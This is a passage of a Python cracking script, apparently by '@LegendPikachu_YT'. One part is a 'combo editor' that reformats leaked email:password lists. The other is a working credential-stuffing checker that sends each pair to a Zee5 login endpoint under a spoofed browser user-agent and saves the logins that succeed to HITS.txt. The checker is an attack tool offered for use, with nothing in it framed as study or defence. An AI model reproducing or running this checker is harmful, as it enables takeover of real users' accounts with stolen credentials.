			save = open('Combo_Editor.txt','a').write(line+'\n')
			print(line)
		
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
		
	elif Combu == "3":
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			try:
				email = line.split(':')[0]
				passw = line.split(':')[1]
				huihui = f'{passw}:{email}'
				save = open('Combo_Editor.txt','a').write(huihui+'\n')
				print(huihui)
			except: print(colored('\n [ - ] Combo Not Supported',color = 'red'))
		
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
		
	elif Combu == "2":
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			line = line.upper()
			save = open('Combo_Editor.txt','a').write(line+'\n')
			print(line)
		
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
		
	elif Combu == "4":
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			try:
				line = line.split(":")[0]
				save = open('Combo_Editor.txt','a').write(line+'\n')
				print(line)
			except: print(colored('\n [ - ] Combo Not Supported',color = 'red'))
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
	elif Combu == "5":
		pus = input('\n Enter The Domain = ')
		if "@" not in pus:
			pus = f'@{pus}'
		else: pass
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			try:
				email = line.split(':')[0]
				passw = line.split(':')[1]
				cb = f'{email}{pus}:{passw}'
				save = open('Combo_Editor.txt','a').write(cb+'\n')
				print(cb)
			except: print(colored('\n [ - ] Combo Not Supported',color = 'red'))
		
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
	elif Combu == "6":
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			try:
				linek = line.split("@")[1]
				save = open(f'{linek}.txt','a').write(line+'\n')
				print(line)
			except: print(colored('\n [ - ] Combo Not Supported',color = 'red'))
		
		print(termcolor.colored('\nSuccesFully Edited Combo',color = 'green'))
	else: print(colored('\n Error 404!'))
elif stats =="5":
 with open('HITS.txt','w+') as freshed:
        pass
 emails1 = []
 passwords1 = []
 hits = []
 hit_count = 0
 bad_count = 0
 Checked = 0
 try:
     os.system("clear")
 except:
     os.system('cls')
 def banner():
     rndm = ["blue",'magenta','cyan','green','yellow']
     clr = random.choice(rndm)
     print(colored('''
        ╭━━━┳━━━┳━━━┳╮╭━┳━━┳━━━┳━━━┳━━━┳━━┳━━━╮╱╱╱╱╭━━━━┳━━━┳━━━┳━━━╮
        ╰╮╭╮┃╭━╮┃╭━╮┃┃┃╭┻┫┣┫╭━━┫╭━╮┃╭━╮┣┫┣┫╭━━╯╱╱╱╱╰━━╮━┃╭━━┫╭━━┫╭━━╯
        ╱┃┃┃┃┃╱┃┃╰━╯┃╰╯╯╱┃┃┃╰━━┫┃╱╰┫╰━╯┃┃┃┃╰━━╮╱╱╱╱╱╱╭╯╭┫╰━━┫╰━━┫╰━━╮
        ╱┃┃┃┃╰━╯┃╭╮╭┫╭╮┃╱┃┃┃╭━━┫┃╱╭┫╭╮╭╯┃┃┃╭━━╯╭━━╮╱╭╯╭╯┃╭━━┫╭━━┻━━╮┃
        ╭╯╰╯┃╭━╮┃┃┃╰┫┃┃╰┳┫┣┫╰━━┫╰━╯┃┃┃╰┳┫┣┫┃╱╱╱╰━━╯╭╯━╰━┫╰━━┫╰━━┳━━╯┃
        ╰━━━┻╯╱╰┻╯╰━┻╯╰━┻━━┻━━━┻━━━┻╯╰━┻━━┻╯╱╱╱╱╱╱╱╰━━━━┻━━━┻━━━┻━━━╯

                 MADE BY @LegendPikachu_YT''',color = clr))
 banner()
 def clear():
        os.system('clear')
 def clrd(msg):
     rndm = ["blue",'magenta','cyan','green','yellow']
     clr = random.choice(rndm)
     print(colored(f'''{msg}''',color = clr))
 def clrd1(msg):
     rndm = ["blue",'magenta','cyan','green','yellow']
     clr = random.choice(rndm)
     print(colored(f'''{msg}''',color = clr),end = '')
 a = ''
 def option():
     print('\n\n')
     clrd('     [+] HIT ANY KEY TO START ')
     input()
     print('\n\n')
     clrd1('    [+] ENTER THE PATH OF THE COMBO FILE = ')
     global a
     a = input()
 option()
 print("\n")
 while a == '':
     os.system('clear')
     banner()
     option()
     continue
 b = open(a).readlines()
 b1 = len(b)
 for lines in b:
     line = lines.replace('\n','')
     if ':' in line:
         email = line.split(':')[0]
         password = line.split(':')[1]
         emalee = emails1.append(email)
         paswee = passwords1.append(password)
     else:
         clrd(' [-] UNSUPPORTED COMBO TYPE ')
         exit()
 headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'}
 def Counter():
        print('\n\n')
        clrd(f' TOTAL = {b1}')
        print('\n')
        clrd(f' CHECKED = {Checked}')
        print('\n')
        clrd(f' HIT = {hit_count}')
        print('\n')
        clrd(f' BAD = {bad_count}')
 Counter()
 for i in range(0,b1):
     url  = f'https://userapi.zee5.com/v1/user/loginemail?email={emails1[i]}&password={passwords1[i]}'
     c = requests.get(url,headers = headers)
     Checked += 1
     d = c.text
     if '{"token"' in d:
         valids = emails1[i]+':'+passwords1[i]
         hit_count += 1
         hitss = open('HITS.txt','a').write(valids + '\n')
         clear()
         banner()
         Counter()
     else:
         invalids = emails1[i]+':'+passwords1[i]
         bad_count += 1
         clear()
         banner()
         Counter()
else: print('\n	Me No Talk You')